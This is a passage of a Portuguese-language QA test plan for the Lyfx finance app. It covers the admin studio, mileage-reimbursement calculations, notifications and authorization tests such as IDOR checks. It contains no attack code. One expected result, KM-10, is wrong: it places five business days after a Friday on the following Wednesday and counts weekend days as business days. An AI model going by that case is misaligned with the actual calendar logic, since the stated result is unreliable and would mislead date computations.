**Prioridade:** MÉDIO
**Resultado esperado:** Todas as opções têm `disabled`. Nenhuma ação ao clicar. Seleção original não muda.

---

### ED-08 — Concluir pílula pela primeira vez
**Prioridade:** CRÍTICO
**Resultado esperado:** Action `completePill` chamada. Registro salvo em `PillProgress`. Barra de progresso da trilha aumenta em 1.

---

### ED-09 — Pílula já concluída — modo releitura
**Prioridade:** ALTO
**Resultado esperado:** Banner verde com data de conclusão. Botão "Rever Quiz" (não cyan). Progresso não reescrito.

---

### ED-10 — alreadyCompleted: true — sem duplicata no banco
**Prioridade:** CRÍTICO
**Resultado esperado:** Segunda chamada de `completePill` retorna `{ alreadyCompleted: true }`. Sem registro duplicado em `PillProgress`.

---

### ED-11 — Sugestão de próxima pílula no hub
**Prioridade:** MÉDIO
**Resultado esperado:** `NextPillCard` exibe próxima pílula não concluída. Qualquer clique em qualquer ponto do card navega corretamente.

---

### ED-12 — Streak semanal: contagem correta
**Prioridade:** ALTO
**Resultado esperado:** Streak exibido como "4 semanas" com 4 blocos coloridos no histórico de 12 semanas.

---

### ED-13 — Semana corrente sem atividade não quebra streak
**Prioridade:** ALTO
**Resultado esperado:** Streak de 3 semanas permanece enquanto a semana atual não terminou.

---

### ED-14 — Trilha muda quando score de saúde muda
**Prioridade:** ALTO
**Resultado esperado:** Trilha recomendada atualiza para corresponder ao novo perfil de saúde.

---

### ED-15 — Timer silencioso registrado corretamente
**Prioridade:** MÉDIO
**Resultado esperado:** `timeSpentSeconds` salvo é ≥ 30 segundos após aguardar 30s. Valor exibido bate com o banco.

---

### ED-16 — Fluxo completo do modal de quiz
**Prioridade:** CRÍTICO
**Passos:** Abrir pílula → clicar "Responder Quiz" → selecionar opção → etapa correção → "Continuar" → etapa conclusão → "Continuar"
**Resultado esperado:** Cada etapa transita corretamente. Botão "Registrando..." durante submit. Redirecionamento para `/education`. Fechar no X (etapa 1) não salva.

---

## 17. Perfil

### PF-01 — Upload de avatar
**Prioridade:** MÉDIO
**Resultado esperado:** Imagem redimensionada para 200×200px no cliente. Avatar atualizado no UserMenu. Sem envio de arquivo original ao servidor.

---

### PF-02 — Auto-fill via ViaCEP
**Prioridade:** MÉDIO
**Passos:** Inserir CEP `01310-100` e clicar na lupa
**Resultado esperado:** Logradouro, Cidade e Estado preenchidos automaticamente. Número/Complemento permanece vazio.

---

### PF-03 — CEP inválido
**Prioridade:** MÉDIO
**Resultado esperado:** Mensagem de erro indicando CEP não encontrado. Campos de endereço inalterados.

---

### PF-04 — Trocar senha com senha atual correta
**Prioridade:** ALTO
**Resultado esperado:** Senha alterada. Login com nova senha funciona. Login com senha antiga falha.

---

### PF-05 — Trocar senha com senha atual incorreta
**Prioridade:** ALTO
**Resultado esperado:** Erro "Senha atual incorreta". Senha não alterada.

---

## 18. Studio G2

> Rota: `/studio` · Actions: `adminLogin`, `adminLogout`, `adminCreateUser`, `adminDeleteUser`, `adminResetPassword`, `getStudioData`, `getAppConfig`, `setAppConfig`, `saveAdminNotes`, `adminSendNotification`, `adminGetManualNotifications`, `getLiveSchema`, `getDocumentation`, `getServerMetrics`

### 18.1 Autenticação do Studio

### ST-01 — Acessar Studio sem senha
**Prioridade:** ALTO
**Resultado esperado:** Formulário de senha exibido. Conteúdo do painel não visível.

---

### ST-02 — Login com senha correta (`ADMIN_SECRET`)
**Prioridade:** ALTO
**Resultado esperado:** Acesso ao painel com todas as abas. Cookie `lyfx_admin` criado com `httpOnly`, `path: /studio`, `maxAge: 2h`.

---

### ST-03 — Login com senha incorreta
**Prioridade:** ALTO
**Resultado esperado:** Mensagem "Senha incorreta." Acesso negado. Cookie de admin não criado.

---

### ST-04 — Sessão de usuário normal persiste após entrar no Studio
**Prioridade:** MÉDIO
**Resultado esperado:** Sessão do usuário normal permanece ativa após login no Studio em outra aba.

---

### ST-05 — Logout do Studio encerra ambas as sessões
**Prioridade:** ALTO
**Resultado esperado:** Cookie do Studio removido E cookie `lyfx_session` do usuário também removido. Redirecionamento para `/`.

---

### ST-06 — Sessão Studio expira após 2h
**Prioridade:** MÉDIO
**Resultado esperado:** Sessão expirada ao manipular data do cookie. Redirecionamento para formulário de senha.

---

### ST-07 — requireAdmin em Server Action — sem cookie de admin
**Prioridade:** CRÍTICO
**Passos:** Via fetch, chamar `adminResetPassword` sem cookie `lyfx_admin`
**Resultado esperado:** Action lança `Error("Unauthorized.")`. Operação não executada.

---

### 18.2 Aba Painel

### ST-08 — Verificar métricas do sistema (6 cards)
**Prioridade:** MÉDIO
**Resultado esperado:** Cards exibem: usuários cadastrados, total de registros, espaço em disco, planos ativos, versão dev e versão prod.

---

### ST-09 — Gauges operacionais (RAM, heap, CPU)
**Prioridade:** MÉDIO
**Resultado esperado:** Gauges SVG renderizam valores de RAM %, heap % e loadAvg. Sem crash. Valores dentro de 0–100%.

---

### ST-10 — Ativar modo manutenção
**Prioridade:** ALTO
**Passos:** Ativar toggle de modo manutenção; acessar `/dashboard` em outra aba
**Resultado esperado:** Banner amarelo de manutenção aparece no topo de todas as telas do app. Sem reinicialização do servidor.

---

### ST-11 — Desativar modo manutenção
**Prioridade:** ALTO
**Resultado esperado:** Banner de manutenção desaparece das telas do app imediatamente.

---

### ST-12 — Editar mensagem do banner de manutenção
**Prioridade:** MÉDIO
**Resultado esperado:** Texto do banner atualizado em todas as telas após salvar. Sem reload do servidor.

---

### ST-13 — Versões dev e prod exibidas simultaneamente
**Prioridade:** MÉDIO
**Pré-condições:** Worktree `lyfx-production/` existente
**Resultado esperado:** Card exibe branch e commit hash de dev E de prod em colunas separadas.

---

### 18.3 Aba Usuários

### ST-14 — Listar usuários com avatar, nome, e-mail e last seen
**Prioridade:** MÉDIO
**Resultado esperado:** Tabela/lista exibe avatar, nome, e-mail, data de cadastro e "visto por último".

---

### ST-15 — Criar usuário via Studio
**Prioridade:** ALTO
**Passos:** Preencher Nome, E-mail e Senha; confirmar criação
**Resultado esperado:** Usuário criado com plano default. Notificação de boas-vindas enviada automaticamente (verificar sino do novo usuário após login).

---

### ST-16 — Criar usuário com e-mail já existente
**Prioridade:** ALTO
**Resultado esperado:** Erro "E-mail já cadastrado." Segundo usuário não criado.

---

### ST-17 — Criar usuário com senha menor que 6 caracteres
**Prioridade:** MÉDIO
**Resultado esperado:** Erro "Senha deve ter ao menos 6 caracteres." Usuário não criado.

---

### ST-18 — Reset de senha pelo administrador
**Prioridade:** ALTO
**Passos:** Clicar em reset de senha para um usuário; inserir nova senha; confirmar
**Resultado esperado:** Senha alterada sem conhecer a senha atual. Login com nova senha funciona.

---

### ST-19 — Deletar usuário e verificar cascade completo
**Prioridade:** CRÍTICO
**Resultado esperado:** Usuário e todos os dados associados removidos: `Transaction`, `Tag`, `Budget`, `Goal`, `GoalPayment`, `Settings`, `Liability`, `Institution`, `Account`, `Asset`, `AssetExpense`, `PillProgress`, `Notification`, `KmPeriod`, `KmRoute`, `KmReceipt`, `KmExpense`, `KmPlace`.

---

### ST-20 — Acessar Studio com sessão de usuário normal (sem cookie admin)
**Prioridade:** ALTO
**Resultado esperado:** Formulário de senha do Studio exibido. O cookie `lyfx_session` do usuário normal não concede acesso ao Studio.

---

### 18.4 Aba Planos

### ST-21 — Criar planos Full e Insider via botão "Criar planos"
**Prioridade:** ALTO
**Resultado esperado:** Planos Full e Insider criados com módulos corretos. Auto-seed idempotente (clicar novamente não duplica).

---

### ST-22 — Verificar plano Full inclui apenas módulos estáveis
**Prioridade:** ALTO
**Resultado esperado:** Plano Full contém todos os módulos sem `isBeta: true`. Módulos beta não incluídos.

---

### ST-23 — Verificar plano Insider inclui todos os módulos incluindo beta
**Prioridade:** ALTO
**Resultado esperado:** Plano Insider contém todos os módulos do Full mais os marcados como beta.

---

### ST-24 — Atribuir plano a um usuário
**Prioridade:** ALTO
**Passos:** Alterar plano de um usuário de Full para Insider
**Resultado esperado:** Usuário passa a ver módulos beta na sidebar sem reinicialização.

---

### 18.5 Aba Módulos

### ST-25 — Toggle beta de um módulo — ativar
**Prioridade:** ALTO
**Passos:** Na aba Módulos, ativar toggle beta para o módulo "Projeções"
**Resultado esperado:** Chip "Beta" amarelo aparece ao lado de "Projeções" na sidebar de todos os usuários. `betaModules` em `AppConfig` atualizado. Sem restart do servidor.

---

### ST-26 — Toggle beta de um módulo — desativar
**Prioridade:** ALTO
**Resultado esperado:** Chip "Beta" desaparece da sidebar. `AppConfig` atualizado.

---

### ST-27 — Módulo desativado no plano não aparece na sidebar
**Prioridade:** CRÍTICO
**Passos:** Remover módulo `reports` do plano Full; logar com usuário Full
**Resultado esperado:** Item "Relatórios" não aparece na sidebar. Tentar acessar `/reports` diretamente resulta em redirect.

---

### 18.6 Aba Notas

### ST-28 — Salvar nota com texto simples
**Prioridade:** MÉDIO
**Passos:** Digitar texto na aba Notas; pressionar Ctrl+S ou clicar em salvar
**Resultado esperado:** Texto salvo em `AppConfig.adminNotes`. Ao recarregar o Studio, o texto persiste.

---

### ST-29 — Slash commands no editor de notas
**Prioridade:** BAIXO
**Passos:** Digitar `/h1` no editor
**Resultado esperado:** Texto transformado para heading H1. Slash commands funcionam conforme documentado.

---

### ST-30 — Atalhos de teclado no editor de notas
**Prioridade:** BAIXO
**Passos:** Selecionar texto; pressionar Ctrl+B
**Resultado esperado:** Texto formatado em negrito. Ctrl+I → itálico.

---

### 18.7 Aba Notificações

### ST-31 — Enviar broadcast para todos os usuários
**Prioridade:** ALTO
**Passos:** Selecionar "Todos os usuários"; inserir título e mensagem; enviar
**Resultado esperado:** Notificação criada para cada usuário. `adminSendNotification` retorna `{ ok: true, count: N }`. Badge no sino de todos os usuários atualiza.

---

### ST-32 — Enviar broadcast para usuários de um plano
**Prioridade:** ALTO
**Passos:** Selecionar tipo "Por plano" → selecionar plano Full
**Resultado esperado:** Apenas usuários do plano Full recebem a notificação. Usuários de outros planos não recebem.

---

### ST-33 — Enviar notificação para usuário específico
**Prioridade:** MÉDIO
**Resultado esperado:** Apenas o usuário selecionado recebe a notificação.

---

### ST-34 — Histórico de broadcasts exibe contagem lidas/total
**Prioridade:** MÉDIO
**Resultado esperado:** Cada entrada do histórico exibe: título, data, total de destinatários e quantos já leram.

---

### ST-35 — Excluir broadcast do histórico
**Prioridade:** MÉDIO
**Passos:** Clicar em excluir em um broadcast com `broadcastId`
**Resultado esperado:** Todas as notificações do grupo (`WHERE broadcastId = ?`) removidas. Histórico atualiza. Badge nos sinos dos usuários decrementa.

---

### ST-36 — Título ou mensagem vazio bloqueado
**Prioridade:** MÉDIO
**Resultado esperado:** `adminSendNotification` retorna `{ error: "Título obrigatório." }` ou `{ error: "Mensagem obrigatória." }`. Nenhuma notificação criada.

---

### ST-37 — Broadcast com zero destinatários
**Prioridade:** MÉDIO
**Passos:** Selecionar plano sem usuários atribuídos
**Resultado esperado:** `adminSendNotification` retorna `{ error: "Nenhum destinatário encontrado." }`. Nenhuma notificação criada.

---

### 18.8 Aba Dados, Schema e Documentação

### ST-38 — Filtrar dados por usuário na aba Dados
**Prioridade:** MÉDIO
**Resultado esperado:** Combobox exibe todos os usuários. Ao selecionar, exibe contagem de registros e transações recentes do usuário selecionado.

---

### ST-39 — Visão global da aba Dados (sem usuário selecionado)
**Prioridade:** MÉDIO
**Resultado esperado:** Exibe as 10 transações mais recentes de todo o sistema.

---

### ST-40 — Renderização do DOCUMENTATION.md na aba Docs
**Prioridade:** BAIXO
**Resultado esperado:** Documentação renderizada com Markdown. Scroll suave ao clicar no TOC lateral. Índice exibe h2, h3, h4 com indentação progressiva.

---

### ST-41 — Diagrama ERD na aba Schema
**Prioridade:** BAIXO
**Resultado esperado:** Tabelas expandíveis/colapsáveis. Linhas de relação entre tabelas. Sem crash no carregamento.

---

## 19. Reembolso Especial (CS-17)

> Rota: `/km-reimbursement` · Actions: `createKmPeriod`, `updateKmPeriod`, `deleteKmPeriod`, `createKmRoute`, `createKmRoutesBulk`, `updateKmRoute`, `deleteKmRoute`, `createKmReceipt`, `updateKmReceipt`, `deleteKmReceipt`, `createKmExpense`, `deleteKmExpense`, `submitPeriod`, `reopenPeriod`, `getKmConfig`, `saveKmConfig`, `getKmPlaces`, `createKmPlace`, `updateKmPlace`, `deleteKmPlace`

### 19.1 Happy Path — Fluxo completo de um período

### KM-01 — Criar período de reembolso
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado com módulo `km-reimbursement` habilitado
**Passos:**
1. Acessar `/km-reimbursement`
2. Clicar em "Novo período"
3. Preencher Nome: `Maio 2026`, Início: `01/05/2026`, Fim: `31/05/2026`, Combustível: `Gasolina`
4. Salvar
**Resultado esperado:** Período criado com status `open`. Aparece na lista de períodos. Totais zerados (kmAmount = 0, grandTotal = 0).

---

### KM-02 — Adicionar trajeto com Google Maps integrado
**Prioridade:** CRÍTICO
**Pré-condições:** Período aberto. `NEXT_PUBLIC_GOOGLE_MAPS_API_KEY` configurada
**Passos:**
1. Abrir o período
2. Na aba Trajetos, clicar em "Novo trajeto"
3. Informar Origem: `Av. Paulista, 1000, São Paulo`, Destino: `Av. Brasil, 500, São Paulo`
4. Verificar cálculo automático de distância via Google Maps
5. Confirmar km calculado (editável)
6. Salvar
**Resultado esperado:** Trajeto criado com `km` preenchido (valor sugerido pelo Maps). `routePolyline` salvo. Totais do período recalculados via `recalcPeriodInternal`.

---

### KM-03 — Adicionar trajeto sem API key do Google Maps (fallback)
**Prioridade:** ALTO
**Pré-condições:** `NEXT_PUBLIC_GOOGLE_MAPS_API_KEY` não configurada ou inválida
**Passos:**
1. Adicionar trajeto informando km manualmente: `45.5`
**Resultado esperado:** Trajeto criado com `routePolyline: null`. Sem mensagem de erro fatal. Funciona sem o Maps. Totais recalculados corretamente com o km manual.

---

### KM-04 — Adicionar múltiplos trajetos em bulk
**Prioridade:** ALTO
**Passos:** Usar `createKmRoutesBulk` para adicionar 3 trajetos de uma vez
**Resultado esperado:** 3 `KmRoute` criados. `recalcPeriodInternal` chamado uma vez (não 3). `totalKm` = soma dos 3.

---

### KM-05 — Adicionar nota de combustível
**Prioridade:** CRÍTICO
**Passos:**
1. Na aba Combustível, clicar em "Nova nota"
2. Data: `15/05/2026`, Tipo: `Gasolina`, Litros: `30`, Valor total: `R$ 210,00`
3. Salvar
**Resultado esperado:** Nota criada. `fuelPriceAvg` recalculado = 210/30 = R$ 7,00/L. `ratePerKm` = 7,00 × 0,25 = R$ 1,75/km. `kmAmount` = totalKm × 1,75.

---

### KM-06 — Fórmula de preço médio ponderado (múltiplas notas)
**Prioridade:** CRÍTICO
**Pré-condições:** Período com 2 notas de combustível
**Passos:**
1. Nota 1: 30L a R$ 210,00 (R$ 7,00/L)
2. Nota 2: 20L a R$ 150,00 (R$ 7,50/L)
**Resultado esperado:** `fuelPriceAvg` = (210 + 150) / (30 + 20) = 360 / 50 = **R$ 7,20/L** (média ponderada, não aritmética simples).

---

### KM-07 — Adicionar despesa extra (pedágio)
**Prioridade:** ALTO
**Passos:** Adicionar despesa tipo "Pedágio", valor `R$ 45,80`
**Resultado esperado:** `extraAmount` do período atualizado. `grandTotal` = kmAmount + 45,80.

---

### KM-08 — Verificar resumo com todos os cálculos
**Prioridade:** CRÍTICO
**Pré-condições:** Período com trajetos (500km), 1 nota gasolina (50L, R$ 350), 1 despesa extra (R$ 45,80)
**Passos:** Acessar aba Resumo
**Resultado esperado:**
- `fuelPriceAvg` = 350/50 = R$ 7,00/L
- `ratePerKm` = 7,00 × 0,25 = R$ 1,75/km
- `kmAmount` = 500 × 1,75 = R$ 875,00
- `extraAmount` = R$ 45,80
- `grandTotal` = R$ 920,80
- Validação combustível: R$ 350 ≥ 15% × R$ 875 = R$ 131,25 → VERDE

---

### KM-09 — Submeter período (D+5 dias úteis)
**Prioridade:** CRÍTICO
**Pré-condições:** Período aberto com grandTotal > 0
**Passos:**
1. Clicar "Marcar como enviado"
2. Confirmar submissão
**Resultado esperado:**
- `KmPeriod.status` → `submitted`
- `submittedAt` registrado
- `expectedPayAt` = submittedAt + 5 dias úteis (pulando sábado e domingo)
- Transaction criada: `type: "credit"`, `category: "credit_variable"`, `amount: grandTotal`, `date: expectedPayAt`, `description: "Reembolso Especial - Maio 2026"`
- `transactionId` salvo no `KmPeriod`
- Transaction aparece em `/transactions` no mês do D+5

---

### KM-10 — D+5 quando submetido na sexta-feira
**Prioridade:** CRÍTICO
**Pré-condições:** Data de submissão = sexta-feira
**Passos:** Submeter período com `paymentDays = 5`
**Resultado esperado:** `expectedPayAt` = quarta-feira da semana seguinte (pula sábado + domingo + segunda + terça + quarta = 5 dias úteis). Verificar com `addBusinessDays`: `getDay() !== 0 && getDay() !== 6`.

---

### KM-11 — D+5 quando submetido na quinta-feira
**Prioridade:** ALTO
**Resultado esperado:** `expectedPayAt` = quinta-feira da semana seguinte (qui→sex = 1, seg = 2, ter = 3, qua = 4, qui = 5).

---

### KM-11b — D+5 com feriado nacional no meio do prazo (CS-25)
**Prioridade:** ALTO
**Pré-condições:** Período submetido em dia com feriado nacional nos próximos 5 dias úteis (ex: submeter na segunda-feira da semana do Corpus Christi, que cai na quinta)
**Passos:** Submeter período; verificar `expectedPayAt`
**Resultado esperado:** `expectedPayAt` pula o feriado — cai na sexta ou na semana seguinte conforme os dias úteis restantes. Não cai no dia do feriado.

---

### KM-11c — D+5 com BrasilAPI offline (fallback CS-25)
**Prioridade:** MÉDIO
**Simulação:** Bloquear `https://brasilapi.com.br` no hosts ou desconectar rede durante o submit
**Resultado esperado:** Submissão conclui normalmente. `expectedPayAt` calculado por sáb/dom apenas (sem feriados). Nenhum erro exibido ao usuário.

---

### KM-11d — D+5 com `paymentDays = 0` (BVA CS-25)
**Prioridade:** BAIXO
**Pré-condições:** Configurar `KmConfig.paymentDays = 0` via settings
**Resultado esperado:** `expectedPayAt` = data de submissão (sem avançar dias). Sem loop infinito, sem crash.

---

### KM-12 — Reabrir período (desfaz submissão)
**Prioridade:** CRÍTICO
**Pré-condições:** Período com status `submitted` e `transactionId` associado
**Passos:** Clicar "Reabrir período"
**Resultado esperado:**
- `KmPeriod.status` → `open`
- `submittedAt: null`, `expectedPayAt: null`, `transactionId: null`
- Transaction associada deletada via `db.transaction.deleteMany({ where: { id: period.transactionId, userId } })`
- Transaction **não aparece mais** em `/transactions`

---

### 19.2 Edge Cases

### KM-13 — Validação mínimo 15% notas de combustível — REPROVADO
**Prioridade:** CRÍTICO
**Pré-condições:** `minFuelPct = 0.15`. Período com 500km, ratePerKm = R$ 1,75 (kmAmount = R$ 875). Nota de combustível = R$ 100 (< 15% × 875 = R$ 131,25)
**Passos:** Verificar aba Resumo; tentar submeter
**Resultado esperado:** Indicador de validação exibe VERMELHO com texto indicando insuficiência. O resumo exibe o valor mínimo exigido (R$ 131,25) vs. o apresentado (R$ 100). A submissão deve ser bloqueada ou alertada com aviso claro.

---

### KM-14 — Validação mínimo 15% — APROVADO (exato)
**Prioridade:** ALTO
**Pré-condições:** Nota de combustível = exatamente 15% do kmAmount
**Resultado esperado:** Indicador VERDE. Submissão liberada.

---

### KM-15 — Período sem trajetos — recalc retorna zeros
**Prioridade:** ALTO
**Passos:** Criar período; não adicionar trajetos; verificar resumo
**Resultado esperado:** `totalKm = 0`, `fuelPriceAvg = 0`, `ratePerKm = 0`, `kmAmount = 0`, `grandTotal = 0`. Sem divisão por zero no cálculo de `fuelPriceAvg` (guarda `if totalLiters > 0`).

---

### KM-16 — Deletar único trajeto — totais voltam a zero
**Prioridade:** ALTO
**Pré-condições:** Período com 1 trajeto de 100km, 1 nota de combustível
**Passos:** Deletar o único trajeto
**Resultado esperado:** `recalcPeriodInternal` chamado. `totalKm = 0`, `kmAmount = 0`. `grandTotal` = apenas extraAmount (se houver). Sem crash.

---

### KM-17 — Deletar única nota de combustível — fuelPriceAvg = 0
**Prioridade:** ALTO
**Pré-condições:** Período com 1 nota de combustível
**Passos:** Deletar a única nota
**Resultado esperado:** `totalLiters = 0` → `fuelPriceAvg = 0` (guarda do `if totalLiters > 0`). `ratePerKm = 0`. `kmAmount = 0`. Sem crash.

---

### KM-18 — Combustível dominante determina taxa (etanol vs gasolina)
**Prioridade:** ALTO
**Pré-condições:** `gasolineRate = 0.25`, `ethanolRate = 0.36`
**Passos:** Adicionar nota gasolina (10L) e nota etanol (15L)
**Resultado esperado:** Etanol domina (15L > 10L). `rate = 0.36`. `ratePerKm = fuelPriceAvg × 0.36`. Verificar que o cálculo usa etanol, não gasolina.

---

### KM-19 — Editar trajeto — polyline preservada se mapa não foi reaberto
**Prioridade:** MÉDIO
**Pré-condições:** Trajeto com `routePolyline` salvo
**Passos:** Editar apenas a descrição do trajeto sem reabrir o mapa
**Resultado esperado:** `routePolyline` do banco preservado (não sobrescrito por null). Verificar lógica: `poly = data.routePolyline ?? route.routePolyline ?? fetchDefault(...)`.

---

### KM-20 — Submeter período já submetido (idempotência)
**Prioridade:** MÉDIO
**Passos:** Chamar `submitPeriod` em período com status `submitted`
**Resultado esperado:** Action retorna imediatamente (`if period.status !== "open" return`). Nenhuma Transaction duplicada criada.

---

### KM-21 — Reabrir período não submetido
**Prioridade:** MÉDIO
**Passos:** Chamar `reopenPeriod` em período com status `open`
**Resultado esperado:** Action retorna imediatamente (`if period.status !== "submitted" return`). Sem erro.

---

### KM-22 — Deletar período com transaction associada
**Prioridade:** ALTO
**Pré-condições:** Período submetido com `transactionId` associado
**Passos:** Deletar o período
**Resultado esperado:** Transaction associada também deletada via `db.transaction.deleteMany`. Período removido. Sem registro órfão em Transaction.

---

### KM-23 — Período com grandTotal = 0 submetido
**Prioridade:** MÉDIO
**Pré-condições:** Período sem trajetos e sem despesas (grandTotal = 0)
**Passos:** Tentar submeter
**Resultado esperado:** Transaction criada com `amount: 0` (ou submissão bloqueada com aviso). Sem crash. Sem valor negativo.

---

### 19.3 Lugares Salvos

### KM-24 — Criar lugar salvo
**Prioridade:** ALTO
**Passos:** Em `/km-reimbursement/places`, criar lugar "Casa → Sede" com origem, destino, kmGoing = 25, kmReturn = 25
**Resultado esperado:** Lugar criado. Aparece na lista de lugares salvos ordenada por nome.

---

### KM-25 — Usar lugar salvo para preencher trajeto
**Prioridade:** ALTO
**Passos:** Na aba Trajetos de um período, clicar no lugar salvo "Casa → Sede"
**Resultado esperado:** Campos origem, destino e km preenchidos automaticamente. Usuário confirma sem redigitar.

---

### KM-26 — Editar lugar salvo
**Prioridade:** MÉDIO
**Resultado esperado:** Alterações salvas. Lista atualiza. Verificar isolamento por userId.

---

### KM-27 — Excluir lugar salvo
**Prioridade:** MÉDIO
**Resultado esperado:** Lugar removido. `db.kmPlace.deleteMany({ where: { id, userId } })` confirma isolamento.

---

### 19.4 Configurações KM

### KM-28 — Salvar configurações personalizadas
**Prioridade:** ALTO
**Passos:** Em `/km-reimbursement/settings`, alterar `gasolineRate = 0.30`, `minFuelPct = 0.20`, `paymentDays = 10`
**Resultado esperado:** Config salva via upsert. Próximo período calculado com os novos valores.

---

### KM-29 — Config inexistente cria default automaticamente
**Prioridade:** MÉDIO
**Passos:** Usuário novo sem `KmConfig` existente; acessar `/km-reimbursement/settings`
**Resultado esperado:** `getKmConfig` cria default: `gasolineRate: 0.25`, `ethanolRate: 0.36`, `minFuelPct: 0.15`, `paymentDays: 5`. Sem erro.

---

### 19.5 Segurança e Isolamento

### KM-30 — IDOR: acessar período de outro usuário
**Prioridade:** CRÍTICO
**Passos:** Logar como Usuário B; chamar `getKmPeriod(idDoPeriodoDeA)`
**Resultado esperado:** Retorna `null`. `WHERE { id, userId }` garante que apenas o dono vê o período.

---

### KM-31 — IDOR: deletar trajeto de outro usuário
**Prioridade:** CRÍTICO
**Passos:** Logar como Usuário B; chamar `deleteKmRoute(idDoTrajutoDeA)`
**Resultado esperado:** `db.kmRoute.findFirst({ where: { id, userId } })` retorna null. Operação não executada.

---

### KM-32 — Acesso sem sessão
**Prioridade:** CRÍTICO
**Resultado esperado:** Qualquer action KM sem sessão lança `Error("Unauthenticated")` via `requireAuth()`.

---

### 19.6 Critérios de Aceite KM

- [ ] Criar período com nome, datas e combustível
- [ ] Adicionar trajetos com ou sem Google Maps
- [ ] Preço médio ponderado calculado corretamente
- [ ] Taxa por km = fuelPriceAvg × rate (gasolina 25% ou etanol 36%)
- [ ] Totais recalculados automaticamente após cada CRUD de trajeto/nota/despesa
- [ ] Validação 15% notas visível no resumo com indicador verde/vermelho
- [ ] Submissão cria Transaction credit_variable com data D+5 dias úteis
- [ ] D+5 pula corretamente sábados e domingos
- [ ] Reabertura deleta a Transaction associada
- [ ] Deletar período deleta Transaction associada
- [ ] Lugares salvos preenchem trajetos automaticamente
- [ ] Isolamento por userId em todas as entidades KM
- [ ] PDF gerado server-side (disponível após ter trajetos)

---

## 20. Central de Notificações (CS-18/CS-19)

> Actions: `getNotifications`, `getUnreadCount`, `markAsRead`, `markAllAsRead`, `deleteNotification`, `deleteAllNotifications`, `createNotification`, `syncDangerAlerts`

### 20.1 Happy Path — Notificações do Sistema

### NOT-01 — Badge de notificações não lidas
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário com 3 notificações manuais não lidas (`fingerprint: null`, `readAt: null`)
**Passos:** Verificar ícone de sino no canto superior direito
**Resultado esperado:** Badge vermelho com número "3". `getUnreadCount` conta apenas `fingerprint: null`. Alertas financeiros automáticos (fingerprint ≠ null) NÃO inflam o badge.

---

### NOT-02 — Abrir dropdown de notificações
**Prioridade:** ALTO
**Passos:** Clicar no ícone de sino
**Resultado esperado:** Dropdown abre com duas seções: (1) alertas financeiros críticos, (2) notificações do sistema. Notificações não lidas destacadas visualmente.

---

### NOT-03 — Marcar notificação como lida
**Prioridade:** ALTO
**Passos:** Clicar em uma notificação não lida
**Resultado esperado:** `markAsRead` chamado. `readAt` registrado. Destaque visual removido. Badge decrementa em 1.

---

### NOT-04 — Marcar todas como lidas
**Prioridade:** ALTO
**Passos:** Clicar em "Marcar todas como lidas"
**Resultado esperado:** `markAllAsRead` chamado. Todos os `readAt` preenchidos (`fingerprint: null, readAt: null` → `readAt: now`). Badge zerado.

---

### NOT-05 — Excluir notificação individual
**Prioridade:** ALTO
**Passos:** Clicar no botão de excluir de uma notificação
**Resultado esperado:** `deleteNotification` chamado. Notificação removida do dropdown. Badge atualiza.

---

### NOT-06 — deleteNotification não apaga alertas automáticos (fingerprint ≠ null)
**Prioridade:** CRÍTICO
**Passos:** Tentar excluir notificação com `fingerprint != null` via payload manipulado
**Resultado esperado:** `db.notification.deleteMany({ where: { id, userId, fingerprint: null } })` — o filtro `fingerprint: null` impede a exclusão. Alerta automático permanece.

---

### NOT-07 — Limpar todas as notificações
**Prioridade:** ALTO
**Passos:** Clicar em "Limpar tudo"
**Resultado esperado:** `deleteAllNotifications` remove apenas notificações com `fingerprint: null`. Alertas automáticos (fingerprint ≠ null) preservados. Badge zerado.

---

### NOT-08 — Notificação de boas-vindas ao criar usuário via Studio
**Prioridade:** ALTO
**Pré-condições:** Criar novo usuário via Studio
**Passos:** Logar com o novo usuário; verificar sino
**Resultado esperado:** Notificação "Bem-vindo ao Lyfx!" com tipo `success` presente no dropdown. `fingerprint: null` (é notificação manual, não alerta automático).

---

### NOT-09 — Notificação recebida via broadcast do Studio
**Prioridade:** ALTO
**Pré-condições:** Studio logado. Enviar broadcast para usuário específico
**Passos:** Logar com o usuário destinatário; verificar sino
**Resultado esperado:** Notificação do broadcast aparece no dropdown. Badge incrementado. `broadcastId` não-null na notificação.

---

### 20.2 Alertas Automáticos (syncDangerAlerts)

### NOT-10 — syncDangerAlerts: orçamento estourado gera notificação persistente
**Prioridade:** ALTO
**Pré-condições:** Orçamento com gasto ≥ 100% do limite
**Passos:** `syncDangerAlerts(userId)` chamado pelo layout
**Resultado esperado:** Notificação do tipo `danger` criada com `fingerprint: "budget-{id}"`, `expiresAt = now + 7d`, link `/budget`. Badge no sino incrementado.

---

### NOT-11 — syncDangerAlerts: deduplicação por fingerprint
**Prioridade:** CRÍTICO
**Pré-condições:** Orçamento estourado. `syncDangerAlerts` já chamado 1x (fingerprint já existe)
**Passos:** Chamar `syncDangerAlerts` novamente
**Resultado esperado:** Nenhuma notificação duplicada criada. A busca `where: { fingerprint: { not: null }, expiresAt: { gt: now } }` detecta o fingerprint existente e pula a criação.

---

### NOT-12 — syncDangerAlerts: meta em atraso
**Prioridade:** ALTO
**Pré-condições:** GoalPayment com `paid: false`, `dueDate < startOfMonth`
**Resultado esperado:** Notificação criada com `fingerprint: "goal-{paymentId}"`, link `/goals`.

---

### NOT-13 — syncDangerAlerts: despesa sazonal em ≤ 1 mês
**Prioridade:** ALTO
**Pré-condições:** Transaction yearly com próximo vencimento em < 30 dias
**Resultado esperado:** Notificação criada com `fingerprint: "seasonal-{txId}"`, link `/fixed-expenses`.

---

### NOT-14 — syncDangerAlerts: passivo crítico (cheque especial/rotativo ativo)
**Prioridade:** ALTO
**Pré-condições:** Liability tipo `cheque_especial` ou `rotativo` com `currentBalance > 0`, `status: active`
**Resultado esperado:** Notificação criada com `fingerprint: "liability-{id}"`, link `/liabilities`.

---

### NOT-15 — Fingerprint expirado permite re-criação
**Prioridade:** MÉDIO
**Pré-condições:** Notificação com fingerprint criada há 8+ dias (expiresAt < now)
**Resultado esperado:** `syncDangerAlerts` não a encontra na busca `{ expiresAt: { gt: now } }`. Nova notificação criada com novo TTL de 7d.

---

### NOT-16 — Alertas automáticos não exibem botão de excluir
**Prioridade:** CRÍTICO
**Pré-condições:** Notificação com `fingerprint != null` no dropdown do sino
**Resultado esperado:** UI não exibe botão de excluir para essas notificações. Apenas as de `fingerprint: null` têm botão de dismiss.

---

### NOT-17 — Expiração de notificação (expiresAt no passado)
**Prioridade:** MÉDIO
**Pré-condições:** Notificação com `expiresAt = ontem`
